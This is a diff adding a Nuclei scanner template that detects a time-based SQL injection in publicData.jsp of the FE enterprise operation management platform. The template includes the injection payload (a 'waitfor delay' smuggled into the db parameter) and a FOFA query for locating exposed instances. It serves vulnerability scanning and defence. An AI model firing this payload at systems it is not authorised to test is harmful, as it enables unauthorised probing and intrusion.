@@ -1,0 +1,37 @@
+id: flyrise-enterprise-operation-management-platform-publicdata-sqli
+info:
+  name: 飞企互联-FE企业运营管理平台 publicData.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: FE企业运营管理平台
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+
+variables:
+  t1: "{{rand_int(5,8)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        GET /oaerp/ui/common/publicData.jsp?type=getAllTableInfo&db=';waitfor+delay+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[]"
+        part: body
+      - type: word
+        words:
+          - "<html"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
